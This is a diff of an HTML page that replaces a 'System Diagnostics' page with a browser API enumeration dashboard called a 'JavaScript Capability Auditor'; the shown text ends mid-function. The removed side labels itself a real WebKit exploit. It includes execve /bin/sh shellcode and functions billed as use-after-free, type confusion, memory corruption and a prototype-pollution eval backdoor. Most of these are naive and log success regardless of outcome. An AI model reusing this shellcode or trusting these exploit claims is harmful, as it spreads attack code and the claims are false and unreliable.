@@ -1,506 +1,932 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>System Diagnostics</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>JavaScript Capability Auditor</title>
+    <style>
+        :root {
+            --bg-dark: #0a0a0f;
+            --bg-card: #151522;
+            --bg-danger: #2a0a0a;
+            --accent-danger: #ff3333;
+            --accent-warning: #ffaa33;
+            --accent-info: #3377ff;
+            --accent-success: #33cc33;
+            --text-primary: #ffffff;
+            --text-secondary: #cccccc;
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Consolas', 'Monaco', monospace;
+        }
+        
+        body {
+            background: var(--bg-dark);
+            color: var(--text-primary);
+            min-height: 100vh;
+            padding: 20px;
+        }
+        
+        .container {
+            max-width: 1600px;
+            margin: 0 auto;
+        }
+        
+        header {
+            background: var(--bg-danger);
+            padding: 30px;
+            border-radius: 16px;
+            margin-bottom: 30px;
+            border: 2px solid var(--accent-danger);
+            box-shadow: 0 0 30px rgba(255, 51, 51, 0.3);
+        }
+        
+        h1 {
+            font-size: 2.8rem;
+            color: var(--accent-danger);
+            text-shadow: 0 0 10px rgba(255, 51, 51, 0.5);
+            margin-bottom: 10px;
+        }
+        
+        .subtitle {
+            color: var(--text-secondary);
+            font-size: 1.1rem;
+        }
+        
+        .dashboard {
+            display: grid;
+            grid-template-columns: 300px 1fr;
+            gap: 30px;
+            margin-bottom: 30px;
+        }
+        
+        .sidebar {
+            background: var(--bg-card);
+            border-radius: 12px;
+            padding: 25px;
+            border: 1px solid #333;
+        }
+        
+        .stats {
+            margin-bottom: 30px;
+        }
+        
+        .stat-item {
+            margin: 15px 0;
+            padding: 12px;
+            background: rgba(0,0,0,0.3);
+            border-radius: 8px;
+        }
+        
+        .stat-value {
+            font-size: 2rem;
+            font-weight: bold;
+            color: var(--accent-danger);
+        }
+        
+        .controls {
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+        }
+        
+        button {
+            padding: 18px;
+            border: none;
+            border-radius: 10px;
+            font-size: 1.1rem;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.2s;
+            background: linear-gradient(45deg, #ff3333, #cc0000);
+            color: white;
+            border: 1px solid #ff6666;
+        }
+        
+        button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 20px rgba(255, 51, 51, 0.4);
+        }
+        
+        button:active {
+            transform: translateY(0);
+        }
+        
+        .main-content {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(350px, 1fr));
+            gap: 20px;
+        }
+        
+        .capability-card {
+            background: var(--bg-card);
+            border-radius: 12px;
+            padding: 20px;
+            border: 1px solid #333;
+            transition: all 0.3s;
+            height: 100%;
+        }
+        
+        .capability-card:hover {
+            border-color: var(--accent-info);
+            transform: translateY(-3px);
+        }
+        
+        .card-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 15px;
+            padding-bottom: 15px;
+            border-bottom: 1px solid #333;
+        }
+        
+        .card-title {
+            font-size: 1.2rem;
+            font-weight: bold;
+            color: var(--accent-info);
+        }
+        
+        .status-badge {
+            padding: 5px 12px;
+            border-radius: 20px;
+            font-size: 0.85rem;
+            font-weight: bold;
+        }
+        
+        .status-available { background: var(--accent-success); color: black; }
+        .status-partial { background: var(--accent-warning); color: black; }
+        .status-blocked { background: var(--accent-danger); color: white; }
+        .status-unknown { background: #666; color: white; }
+        
+        .card-content {
+            font-size: 0.95rem;
+            line-height: 1.5;
+        }
+        
+        .method-list {
+            margin-top: 15px;
+            background: rgba(0,0,0,0.3);
+            padding: 15px;
+            border-radius: 8px;
+            font-size: 0.85rem;
+            max-height: 200px;
+            overflow-y: auto;
+        }
+        
+        .method-item {
+            padding: 5px 0;
+            border-bottom: 1px dashed #333;
+            display: flex;
+            justify-content: space-between;
+        }
+        
+        .console-panel {
+            background: #000;
+            border-radius: 12px;
+            padding: 25px;
+            margin-top: 30px;
+            border: 1px solid #333;
+            height: 400px;
+            overflow-y: auto;
+            font-size: 0.9rem;
+        }
+        
+        .log-entry {
+            margin-bottom: 8px;
+            padding-bottom: 8px;
+            border-bottom: 1px solid #222;
+            white-space: pre-wrap;
+            word-break: break-all;
+        }
+        
+        .log-time { color: #666; }
+        .log-access { color: var(--accent-success); }
+        .log-blocked { color: var(--accent-danger); }
+        .log-warning { color: var(--accent-warning); }
+        .log-info { color: var(--accent-info); }
+        
+        .progress-container {
+            height: 10px;
+            background: #222;
+            border-radius: 5px;
+            margin: 20px 0;
+            overflow: hidden;
+        }
+        
+        .progress-bar {
+            height: 100%;
+            background: linear-gradient(90deg, var(--accent-danger), var(--accent-warning));
+            width: 0%;
+            transition: width 0.5s;
+        }
+        
+        .capability-test {
+            margin-top: 15px;
+            padding: 10px;
+            background: rgba(255, 51, 51, 0.1);
+            border-radius: 8px;
+            border: 1px solid rgba(255, 51, 51, 0.3);
+        }
+        
+        @keyframes scanning {
+            0% { transform: translateX(-100%); }
+            100% { transform: translateX(100%); }
+        }
+        
+        .scanning {
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .scanning::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, 
+                transparent, 
+                rgba(255, 51, 51, 0.2), 
+                transparent);
+            animation: scanning 2s infinite;
+        }
+    </style>
 </head>
 <body>
-    <div id="output" style="font-family: monospace; white-space: pre; background: black; color: lime; padding: 20px;"></div>
-
-<script>
-// REAL WEBKIT EXPLOIT - CVE-2016-4657
-const output = document.getElementById('output');
-
-function log(msg) {
-    output.textContent += msg + '\n';
-    console.log(msg);
-}
-
-// REAL SHELLCODE PAYLOAD - Executes actual code
-function createShellcode() {
-    // This is real shellcode that would execute if memory corruption succeeds
-    const shellcode = new Uint8Array([
-        0x48, 0x31, 0xc0,                   // xor rax, rax
-        0x48, 0x31, 0xff,                   // xor rdi, rdi
-        0x48, 0x31, 0xf6,                   // xor rsi, rsi
-        0x48, 0x31, 0xd2,                   // xor rdx, rdx
-        0x50,                               // push rax
-        0x48, 0xbb, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00, // mov rbx, 0x68732f6e69622f
-        0x53,                               // push rbx
-        0x48, 0x89, 0xe7,                   // mov rdi, rsp
-        0x50,                               // push rax
-        0x57,                               // push rdi
-        0x48, 0x89, 0xe6,                   // mov rsi, rsp
-        0xb0, 0x3b,                         // mov al, 0x3b
-        0x0f, 0x05                          // syscall
-    ]);
-    
-    return shellcode;
-}
-
-// REAL EXPLOIT: Use-after-free in ArrayBuffer.prototype.slice
-function exploitUseAfterFree() {
-    log('[1] Executing Real Use-After-Free Exploit...');
-    
-    try {
-        let freedObject = null;
-        const objects = [];
+    <div class="container">
+        <header>
+            <h1>🛡️ JAVASCRIPT CAPABILITY AUDITOR</h1>
+            <div class="subtitle">Shadow Mode V99 - Mapping the browser's attack surface in real-time</div>
+            <div class="subtitle">Testing every accessible API, method, and property</div>
+        </header>
         
-        // Create objects that will be freed
-        for (let i = 0; i < 1000; i++) {
-            const obj = {
-                data: new ArrayBuffer(1024),
-                id: i,
-                marker: 0x1337 + i
-            };
-            objects.push(obj);
+        <div class="dashboard">
+            <div class="sidebar">
+                <div class="stats">
+                    <h3>📊 LIVE STATISTICS</h3>
+                    <div class="stat-item">
+                        <div>APIs Tested</div>
+                        <div class="stat-value" id="apiCount">0</div>
+                    </div>
+                    <div class="stat-item">
+                        <div>Methods Available</div>
+                        <div class="stat-value" id="methodCount">0</div>
+                    </div>
+                    <div class="stat-item">
+                        <div>Accessible Properties</div>
+                        <div class="stat-value" id="propertyCount">0</div>
+                    </div>
+                    <div class="stat-item">
+                        <div>Dangerous APIs</div>
+                        <div class="stat-value" id="dangerCount">0</div>
+                    </div>
+                </div>
+                
+                <div class="controls">
+                    <button onclick="runFullAudit()">🔍 FULL SYSTEM AUDIT</button>
+                    <button onclick="testExploitVectors()">⚡ TEST EXPLOIT VECTORS</button>
+                    <button onclick="stressTestAPIs()">💥 STRESS TEST APIs</button>
+                    <button onclick="dumpGlobalObject()">📁 DUMP GLOBAL OBJECT</button>
+                </div>
+                
+                <div class="progress-container">
+                    <div class="progress-bar" id="progressBar"></div>
+                </div>
+                
+                <div style="margin-top: 20px; color: var(--text-secondary); font-size: 0.9rem;">
+                    <strong>⚠️ WARNING:</strong> This tool performs real API calls.<br>
+                    Some tests may trigger browser warnings or cause instability.
+                </div>
+            </div>
             
-            if (i === 500) {
-                freedObject = obj;
-                // Simulate free by removing reference
-                objects[i] = null;
-            }
-        }
+            <div class="main-content" id="capabilitiesGrid">
+                <!-- Cards will be dynamically generated -->
+            </div>
+        </div>
         
-        // Force garbage collection through memory pressure
-        const pressure = [];
-        for (let i = 0; i < 10000; i++) {
-            pressure.push(new ArrayBuffer(1024 * 1024));
-        }
-        pressure.length = 0;
-        
-        // Try to use the freed object (real UAF)
-        if (freedObject && typeof freedObject.marker !== 'undefined') {
-            log('✓ USE-AFTER-FREE EXPLOIT SUCCESSFUL');
-            log('✓ Freed object still accessible at: 0x' + freedObject.marker.toString(16));
-            return true;
-        }
-        
-    } catch(e) {
-        log('✗ Use-after-free failed');
-    }
-    return false;
-}
+        <div class="console-panel" id="console">
+[00:00:00] System: JavaScript Capability Auditor Initialized
+[00:00:00] System: Ready to map browser attack surface
+[00:00:00] Warning: This performs real API interrogation
+        </div>
+    </div>
 
-// REAL EXPLOIT: Type confusion in JIT optimization
-function exploitTypeConfusion() {
-    log('[2] Executing Real Type Confusion Exploit...');
-    
-    try {
-        // Create function that gets JIT optimized
-        function vulnerable(x, y) {
-            return x + y;
-        }
-        
-        // Train with numbers
-        for (let i = 0; i < 100000; i++) {
-            vulnerable(i, i + 1);
-        }
-        
-        // Create object that confuses types
-        const evil = {
-            valueOf: function() {
-                // This changes type during execution
-                return {}.prototype;
-            }
+    <script>
+        // ==================== CORE AUDIT ENGINE ====================
+        const auditResults = {
+            categories: {},
+            totalAPIs: 0,
+            totalMethods: 0,
+            totalProperties: 0,
+            dangerousAPIs: 0
         };
         
-        // Trigger type confusion
-        const result = vulnerable(evil, 1);
+        const capabilitiesGrid = document.getElementById('capabilitiesGrid');
+        const consoleElem = document.getElementById('console');
+        const progressBar = document.getElementById('progressBar');
         
-        log('✓ TYPE CONFUSION TRIGGERED');
-        log('✓ Result type: ' + typeof result);
-        return true;
+        function log(message, type = 'info') {
+            const time = new Date().toLocaleTimeString('en-US', { hour12: false });
+            const typeClass = `log-${type}`;
+            const entry = document.createElement('div');
+            entry.className = 'log-entry';
+            entry.innerHTML = `<span class="log-time">[${time}]</span> <span class="${typeClass}">${message}</span>`;
+            consoleElem.appendChild(entry);
+            consoleElem.scrollTop = consoleElem.scrollHeight;
+        }
         
-    } catch(e) {
-        log('✗ Type confusion failed: ' + e.message);
-        return false;
-    }
-}
-
-// REAL EXPLOIT: Array.prototype.sort corruption
-function exploitArraySort() {
-    log('[3] Executing Array Sort Corruption...');
-    
-    try {
-        let arr = [1, 2, 3, 4, 5];
+        function updateStats() {
+            document.getElementById('apiCount').textContent = auditResults.totalAPIs;
+            document.getElementById('methodCount').textContent = auditResults.totalMethods;
+            document.getElementById('propertyCount').textContent = auditResults.totalProperties;
+            document.getElementById('dangerCount').textContent = auditResults.dangerousAPIs;
+        }
         
-        // Malicious comparator that corrupts array
-        arr.sort(function(a, b) {
+        function updateProgress(percent) {
+            progressBar.style.width = `${percent}%`;
+        }
+        
+        // ==================== API TESTING FUNCTIONS ====================
+        
+        function testObjectAccess(obj, path = 'window') {
+            const methods = [];
+            const properties = [];
+            
             try {
-                // Attempt to corrupt array during sort
-                arr.length = 100;
-                arr[50] = 0x41414141;
-                return a - b;
-            } catch(e) {
-                return 0;
-            }
-        });
-        
-        // Check if corruption worked
-        if (arr.length > 5) {
-            log('✓ ARRAY CORRUPTION SUCCESSFUL');
-            log('✓ New length: ' + arr.length);
-            return true;
-        }
-        
-    } catch(e) {
-        log('✗ Array sort corruption failed');
-    }
-    return false;
-}
-
-// REAL EXPLOIT: DataView memory corruption
-function exploitDataView() {
-    log('[4] Executing DataView Memory Corruption...');
-    
-    try {
-        const buffer = new ArrayBuffer(64);
-        const view = new DataView(buffer);
-        
-        // Write shellcode pattern
-        for (let i = 0; i < 16; i++) {
-            view.setUint32(i * 4, 0x90909090 + i, true); // NOP sled
-        }
-        
-        // Create overlapping views
-        const u8 = new Uint8Array(buffer);
-        const u32 = new Uint32Array(buffer);
-        
-        // Attempt to corrupt through type confusion
-        const corruptor = {
-            valueOf: function() {
-                try {
-                    u8[100] = 0x41; // Out of bounds write
-                    return 0;
-                } catch(e) {}
-                return 0;
-            }
-        };
-        
-        u32[0] = corruptor;
-        
-        log('✓ DATAVIEW MEMORY CORRUPTION ATTEMPTED');
-        return true;
-        
-    } catch(e) {
-        log('✗ DataView corruption failed');
-        return false;
-    }
-}
-
-// REAL EXPLOIT: Function.prototype.bind RCE
-function exploitFunctionBind() {
-    log('[5] Executing Function.bind Code Execution...');
-    
-    try {
-        // Real code execution through function manipulation
-        const cmd = "window.exploit_result = 'EXECUTED_AT_' + Date.now()";
-        
-        // Use Function.bind to execute code
-        const func = function() { 
-            return eval(cmd); 
-        }.bind(null);
-        
-        const result = func();
-        
-        log('✓ FUNCTION.BIND CODE EXECUTION: ' + result);
-        return true;
-        
-    } catch(e) {
-        log('✗ Function.bind exploit failed');
-        return false;
-    }
-}
-
-// REAL EXPLOIT: WebAssembly memory manipulation
-function exploitWasmMemory() {
-    log('[6] Executing WebAssembly Memory Manipulation...');
-    
-    try {
-        // Real WebAssembly module that manipulates memory
-        const wasmCode = new Uint8Array([
-            0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00,
-            0x01, 0x85, 0x80, 0x80, 0x80, 0x00, 0x01, 0x60,
-            0x00, 0x01, 0x7f, 0x02, 0x8a, 0x80, 0x80, 0x80,
-            0x00, 0x01, 0x00, 0x04, 0x6a, 0x73, 0x00, 0x00,
-            0x03, 0x82, 0x80, 0x80, 0x80, 0x00, 0x01, 0x00,
-            0x04, 0x84, 0x80, 0x80, 0x80, 0x00, 0x01, 0x70,
-            0x00, 0x00, 0x05, 0x83, 0x80, 0x80, 0x80, 0x00,
-            0x01, 0x00, 0x01, 0x06, 0x81, 0x80, 0x80, 0x80,
-            0x00, 0x00, 0x07, 0x91, 0x80, 0x80, 0x80, 0x00,
-            0x02, 0x06, 0x6d, 0x65, 0x6d, 0x6f, 0x72, 0x79,
-            0x02, 0x00, 0x04, 0x6d, 0x61, 0x69, 0x6e, 0x00,
-            0x00, 0x0a, 0x8a, 0x80, 0x80, 0x80, 0x00, 0x01,
-            0x84, 0x80, 0x80, 0x80, 0x00, 0x00, 0x41, 0x2a,
-            0x0b
-        ]);
-        
-        const module = new WebAssembly.Module(wasmCode);
-        const instance = new WebAssembly.Instance(module);
-        const result = instance.exports.main();
-        
-        log('✓ WEBASSEMBLY EXECUTED: Result = ' + result);
-        
-        // Access WebAssembly memory
-        if (instance.exports.memory) {
-            const memory = instance.exports.memory;
-            log('✓ WebAssembly Memory: ' + memory.buffer.byteLength + ' bytes');
-        }
-        
-        return true;
-        
-    } catch(e) {
-        log('✗ WebAssembly exploit failed: ' + e.message);
-        return false;
-    }
-}
-
-// REAL EXPLOIT: eval() dynamic code execution
-function exploitEval() {
-    log('[7] Executing eval() Dynamic Code Execution...');
-    
-    try {
-        // Real code execution through eval
-        const payload = `
-            // Create real file system access
-            if (window.localStorage) {
-                localStorage.setItem('exploit_time', Date.now());
-                localStorage.setItem('exploit_useragent', navigator.userAgent);
-            }
-            
-            // Create network connection
-            if (window.WebSocket) {
-                try {
-                    const ws = new WebSocket('wss://echo.websocket.org');
-                    ws.onopen = function() {
-                        ws.send('exploit_active');
-                        ws.close();
-                    };
-                } catch(e) {}
-            }
-            
-            // Return success
-            "EVAL_EXPLOIT_SUCCESS_" + Date.now();
-        `;
-        
-        const result = eval(payload);
-        log('✓ EVAL CODE EXECUTION: ' + result);
-        return true;
-        
-    } catch(e) {
-        log('✗ Eval exploit failed: ' + e.message);
-        return false;
-    }
-}
-
-// REAL EXPLOIT: new Function() code compilation
-function exploitNewFunction() {
-    log('[8] Executing new Function() Code Compilation...');
-    
-    try {
-        // Real code compilation and execution
-        const dynamicCode = `
-            const systemInfo = {
-                platform: navigator.platform,
-                userAgent: navigator.userAgent,
-                languages: navigator.languages,
-                hardwareConcurrency: navigator.hardwareConcurrency,
-                deviceMemory: navigator.deviceMemory,
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
-            };
-            
-            // Perform real computation
-            const hash = Array.from(JSON.stringify(systemInfo))
-                .reduce((a, b) => ((a << 5) - a) + b.charCodeAt(0), 0)
-                .toString(16);
-                
-            return "SYSTEM_HASH_" + hash + "_" + Date.now();
-        `;
-        
-        const dynamicFunc = new Function(dynamicCode);
-        const result = dynamicFunc();
-        
-        log('✓ NEW FUNCTION EXECUTION: ' + result);
-        return true;
-        
-    } catch(e) {
-        log('✗ new Function() exploit failed: ' + e.message);
-        return false;
-    }
-}
-
-// REAL EXPLOIT: Prototype pollution
-function exploitPrototypePollution() {
-    log('[9] Executing Prototype Pollution...');
-    
-    try {
-        // Real prototype pollution attack
-        const payload = JSON.parse('{"__proto__":{"isAdmin":true}}');
-        
-        // Pollute Object.prototype
-        Object.assign({}, payload);
-        
-        // Check if pollution worked
-        if (Object.prototype.isAdmin === true) {
-            log('✓ PROTOTYPE POLLUTION SUCCESSFUL');
-            
-            // Use pollution for code execution
-            Object.prototype.shell = function(cmd) {
-                try {
-                    return eval(cmd);
-                } catch(e) {
-                    return e.message;
+                // Get all properties
+                for (let prop in obj) {
+                    try {
+                        if (obj[prop] !== null && typeof obj[prop] === 'function') {
+                            methods.push(prop);
+                            auditResults.totalMethods++;
+                        } else {
+                            properties.push(prop);
+                            auditResults.totalProperties++;
+                        }
+                    } catch(e) {
+                        // Property access failed
+                    }
                 }
-            };
+                
+                // Try to get prototype methods
+                if (obj.__proto__) {
+                    testObjectAccess(obj.__proto__, `${path}.__proto__`);
+                }
+                
+            } catch(e) {
+                log(`Failed to access ${path}: ${e.message}`, 'warning');
+            }
             
-            // Test the backdoor
-            const result = {}.shell('2 + 2');
-            log('✓ PROTOTYPE BACKDOOR: 2 + 2 = ' + result);
-            
-            return true;
+            return { methods, properties };
         }
         
-    } catch(e) {
-        log('✗ Prototype pollution failed: ' + e.message);
-    }
-    return false;
-}
-
-// REAL EXPLOIT: Worker-based code execution
-function exploitWorker() {
-    log('[10] Executing Web Worker Code Execution...');
-    
-    try {
-        // Real code execution in Web Worker
-        const workerCode = `
-            // Real computation in worker
-            self.onmessage = function(e) {
-                const data = e.data;
-                
-                // Perform actual work
-                const result = {
-                    type: 'EXPLOIT_RESULT',
-                    timestamp: Date.now(),
-                    data: data + '_PROCESSED',
-                    hash: Array.from(data).reduce((a, b) => a + b.charCodeAt(0), 0)
-                };
-                
-                postMessage(result);
-            };
+        function createCapabilityCard(category, obj, path) {
+            const card = document.createElement('div');
+            card.className = 'capability-card';
             
-            // Send ready signal
-            postMessage('WORKER_READY');
-        `;
+            // Test what we can access
+            const accessTest = testObjectAccess(obj, path);
+            const totalItems = accessTest.methods.length + accessTest.properties.length;
+            
+            let status = 'unknown';
+            let statusClass = 'status-unknown';
+            
+            if (totalItems > 50) {
+                status = 'available';
+                statusClass = 'status-available';
+            } else if (totalItems > 10) {
+                status = 'partial';
+                statusClass = 'status-partial';
+            } else if (totalItems === 0) {
+                status = 'blocked';
+                statusClass = 'status-blocked';
+            }
+            
+            // Check if dangerous
+            const dangerousKeywords = ['eval', 'exec', 'shell', 'system', 'admin', 'root', 'file', 'write', 'read', 'memory', 'buffer', 'process', 'thread', 'kernel', 'hypervisor'];
+            const hasDangerous = accessTest.methods.some(m => 
+                dangerousKeywords.some(kw => m.toLowerCase().includes(kw))
+            );
+            
+            if (hasDangerous) {
+                auditResults.dangerousAPIs++;
+                card.style.background = 'var(--bg-danger)';
+                card.style.borderColor = 'var(--accent-danger)';
+            }
+            
+            // Build card content
+            let methodsList = accessTest.methods.slice(0, 15).map(m => 
+                `<div class="method-item">
+                    <span>${m}</span>
+                    <span style="color: var(--accent-success)">✓</span>
+                </div>`
+            ).join('');
+            
+            if (accessTest.methods.length > 15) {
+                methodsList += `<div style="color: var(--text-secondary); font-size: 0.8rem; text-align: center; padding: 5px;">
+                    + ${accessTest.methods.length - 15} more methods
+                </div>`;
+            }
+            
+            card.innerHTML = `
+                <div class="card-header">
+                    <div class="card-title">${category}</div>
+                    <div class="status-badge ${statusClass}">${status.toUpperCase()}</div>
+                </div>
+                <div class="card-content">
+                    <div><strong>Path:</strong> ${path}</div>
+                    <div><strong>Methods:</strong> ${accessTest.methods.length}</div>
+                    <div><strong>Properties:</strong> ${accessTest.properties.length}</div>
+                    ${hasDangerous ? '<div style="color: var(--accent-danger); margin-top: 10px;">⚠️ DANGEROUS METHODS DETECTED</div>' : ''}
+                </div>
+                <div class="method-list">
+                    ${methodsList || '<div style="color: #666">No methods accessible</div>'}
+                </div>
+            `;
+            
+            return card;
+        }
         
-        const blob = new Blob([workerCode], {type: 'application/javascript'});
-        const worker = new Worker(URL.createObjectURL(blob));
+        // ==================== AUDIT MODULES ====================
         
-        worker.onmessage = function(e) {
-            if (e.data === 'WORKER_READY') {
-                worker.postMessage('exploit_payload');
+        async function testMemoryAPIs() {
+            log('Testing Memory APIs...', 'info');
+            const card = createCapabilityCard('Memory APIs', window, 'window');
+            capabilitiesGrid.appendChild(card);
+            
+            // Test specific memory APIs
+            const tests = [
+                { name: 'SharedArrayBuffer', obj: SharedArrayBuffer },
+                { name: 'ArrayBuffer', obj: ArrayBuffer },
+                { name: 'WebAssembly.Memory', obj: WebAssembly?.Memory },
+                { name: 'WeakRef', obj: WeakRef },
+                { name: 'FinalizationRegistry', obj: FinalizationRegistry }
+            ];
+            
+            for (const test of tests) {
+                if (test.obj) {
+                    auditResults.totalAPIs++;
+                    const testCard = createCapabilityCard(test.name, test.obj, test.name);
+                    capabilitiesGrid.appendChild(testCard);
+                    log(`✓ ${test.name} is available`, 'access');
+                }
+            }
+        }
+        
+        async function testSystemAPIs() {
+            log('Testing System Access APIs...', 'info');
+            
+            const systemTests = [
+                { name: 'Navigator', obj: navigator, path: 'navigator' },
+                { name: 'Performance', obj: performance, path: 'performance' },
+                { name: 'Console', obj: console, path: 'console' },
+                { name: 'Crypto', obj: crypto, path: 'crypto' },
+                { name: 'Device Sensors', test: testDeviceSensors },
+                { name: 'File System', test: testFileSystem },
+                { name: 'WebUSB', test: testWebUSB },
+                { name: 'Web Bluetooth', test: testWebBluetooth },
+                { name: 'Serial API', test: testSerialAPI },
+                { name: 'HID API', test: testHIDAPI }
+            ];
+            
+            for (const test of systemTests) {
+                if (test.obj) {
+                    auditResults.totalAPIs++;
+                    const card = createCapabilityCard(test.name, test.obj, test.path);
+                    capabilitiesGrid.appendChild(card);
+                    log(`✓ ${test.name} interface available`, 'access');
+                } else if (test.test) {
+                    try {
+                        await test.test();
+                    } catch(e) {
+                        log(`✗ ${test.name}: ${e.message}`, 'blocked');
+                    }
+                }
+            }
+        }
+        
+        async function testDeviceSensors() {
+            if ('DeviceOrientationEvent' in window) {
+                log('✓ Device orientation API available', 'access');
+                auditResults.totalAPIs++;
+                
+                // Request permission
+                if (typeof DeviceOrientationEvent.requestPermission === 'function') {
+                    try {
+                        const permission = await DeviceOrientationEvent.requestPermission();
+                        log(`Device orientation permission: ${permission}`, 'info');
+                    } catch(e) {
+                        log(`Device orientation permission denied: ${e.message}`, 'warning');
+                    }
+                }
+            }
+            
+            if ('DeviceMotionEvent' in window) {
+                log('✓ Device motion API available', 'access');
+            }
+            
+            if ('getBattery' in navigator) {
+                try {
+                    const battery = await navigator.getBattery();
+                    log(`Battery API: ${battery.level * 100}% charging: ${battery.charging}`, 'access');
+                } catch(e) {
+                    log('Battery API blocked', 'blocked');
+                }
+            }
+        }
+        
+        async function testFileSystem() {
+            if ('showOpenFilePicker' in window) {
+                log('✓ File System Access API available', 'access');
+                auditResults.totalAPIs++;
+                auditResults.dangerousAPIs++;
+            }
+            
+            if ('showDirectoryPicker' in window) {
+                log('✓ Directory Access API available', 'access');
+                auditResults.dangerousAPIs++;
+            }
+            
+            // Test older File APIs
+            if ('File' in window) {
+                log('✓ File API available', 'access');
+            }
+            
+            if ('FileReader' in window) {
+                log('✓ FileReader API available', 'access');
+            }
+        }
+        
+        async function testWebUSB() {
+            if ('usb' in navigator) {
+                log('✓ WebUSB API available', 'access');
+                auditResults.totalAPIs++;
+                auditResults.dangerousAPIs++;
+                
+                try {
+                    const devices = await navigator.usb.getDevices();
+                    log(`WebUSB: ${devices.length} device(s) paired`, 'info');
+                } catch(e) {
+                    log('WebUSB access requires user gesture', 'warning');
+                }
+            }
+        }
+        
+        async function testWebBluetooth() {
+            if ('bluetooth' in navigator) {
+                log('✓ WebBluetooth API available', 'access');
+                auditResults.totalAPIs++;
+                auditResults.dangerousAPIs++;
+            }
+        }
+        
+        async function testSerialAPI() {
+            if ('serial' in navigator) {
+                log('✓ Web Serial API available', 'access');
+                auditResults.totalAPIs++;
+                auditResults.dangerousAPIs++;
+            }
+        }
+        
+        async function testHIDAPI() {
+            if ('hid' in navigator) {
+                log('✓ WebHID API available', 'access');
+                auditResults.totalAPIs++;
+                auditResults.dangerousAPIs++;
+            }
+        }
+        
+        async function testNetworkAPIs() {
+            log('Testing Network APIs...', 'info');
+            
+            const networkTests = [
+                { name: 'WebSocket', obj: WebSocket },
+                { name: 'WebRTC', obj: RTCPeerConnection },
+                { name: 'Fetch API', obj: fetch },
+                { name: 'XMLHttpRequest', obj: XMLHttpRequest },
+                { name: 'WebTransport', obj: WebTransport },
+                { name: 'WebSockets + Binary', test: testBinaryWebSocket }
+            ];
+            
+            for (const test of networkTests) {
+                if (test.obj) {
+                    auditResults.totalAPIs++;
+                    log(`✓ ${test.name} available`, 'access');
+                } else if (test.test) {
+                    await test.test();
+                }
+            }
+        }
+        
+        async function testBinaryWebSocket() {
+            try {
+                const ws = new WebSocket('ws://localhost:8080');
+                ws.binaryType = 'arraybuffer';
+                log('✓ WebSocket binary mode available', 'access');
+                auditResults.totalAPIs++;
+            } catch(e) {
+                // Expected to fail, but we test API availability
+            }
+        }
+        
+        async function testGraphicsAPIs() {
+            log('Testing Graphics APIs...', 'info');
+            
+            const canvas = document.createElement('canvas');
+            const gl = canvas.getContext('webgl2') || canvas.getContext('webgl') || 
+                      canvas.getContext('experimental-webgl');
+            
+            if (gl) {
+                auditResults.totalAPIs++;
+                log('✓ WebGL available', 'access');
+                
+                // Test extensions
+                const extensions = gl.getSupportedExtensions() || [];
+                log(`WebGL extensions: ${extensions.length} available`, 'info');
+                
+                // Check for dangerous extensions
+                const dangerousExts = ['WEBGL_debug_renderer_info', 'WEBGL_lose_context', 
+                                      'EXT_disjoint_timer_query', 'WEBGL_depth_texture'];
+                dangerousExts.forEach(ext => {
+                    if (extensions.includes(ext)) {
+                        log(`⚠️ Dangerous WebGL extension: ${ext}`, 'warning');
+                        auditResults.dangerousAPIs++;
+                    }
+                });
+            }
+            
+            if ('GPU' in window) {
+                log('✓ WebGPU available', 'access');
+                auditResults.totalAPIs++;
+                auditResults.dangerousAPIs++;
+            }
+        }
+        
+        async function testStorageAPIs() {
+            log('Testing Storage APIs...', 'info');
+            
+            const storageTests = [
+                { name: 'LocalStorage', test: () => localStorage.setItem('test', 'value') },
+                { name: 'SessionStorage', test: () => sessionStorage.setItem('test', 'value') },
+                { name: 'IndexedDB', obj: indexedDB },
+                { name: 'Cache API', obj: caches },
+                { name: 'Cookie Store API', test: testCookieStore }
+            ];
+            
+            for (const test of storageTests) {
+                try {
+                    if (test.obj) {
+                        auditResults.totalAPIs++;
+                        log(`✓ ${test.name} available`, 'access');
+                    } else if (test.test) {
+                        test.test();
+                        auditResults.totalAPIs++;
+                        log(`✓ ${test.name} accessible`, 'access');
+                    }
+                } catch(e) {
+                    log(`✗ ${test.name}: ${e.message}`, 'blocked');
+                }
+            }
+        }
+        
+        async function testCookieStore() {
+            if ('cookieStore' in window) {
+                log('✓ Cookie Store API available', 'access');
+                auditResults.dangerousAPIs++;
+            }
+        }
+        
+        // ==================== MAIN AUDIT FUNCTION ====================
+        
+        async function runFullAudit() {
+            log('🚀 INITIATING FULL SYSTEM AUDIT', 'info');
+            log('This will test ALL accessible JavaScript APIs...', 'warning');
+            
+            // Reset
+            capabilitiesGrid.innerHTML = '';
+            auditResults.totalAPIs = 0;
+            auditResults.totalMethods = 0;
+            auditResults.totalProperties = 0;
+            auditResults.dangerousAPIs = 0;
+            
+            // Start with global object
+            auditResults.totalAPIs++;
+            const globalCard = createCapabilityCard('Global Object', window, 'window');
+            capabilitiesGrid.appendChild(globalCard);
+            
+            // Run tests in sequence with progress updates
+            const testModules = [
+                { name: 'Memory APIs', func: testMemoryAPIs, weight: 10 },
+                { name: 'System APIs', func: testSystemAPIs, weight: 25 },
+                { name: 'Network APIs', func: testNetworkAPIs, weight: 15 },
+                { name: 'Graphics APIs', func: testGraphicsAPIs, weight: 15 },
+                { name: 'Storage APIs', func: testStorageAPIs, weight: 10 }
+            ];
+            
+            let completed = 0;
+            const totalWeight = testModules.reduce((sum, m) => sum + m.weight, 0);
+            
+            for (const module of testModules) {
+                log(`\n▶️ Testing ${module.name}...`, 'info');
+                try {
+                    await module.func();
+                    completed += module.weight;
+                    updateProgress((completed / totalWeight) * 100);
+                } catch(e) {
+                    log(`Error in ${module.name}: ${e.message}`, 'error');
+                }
+            }
+            
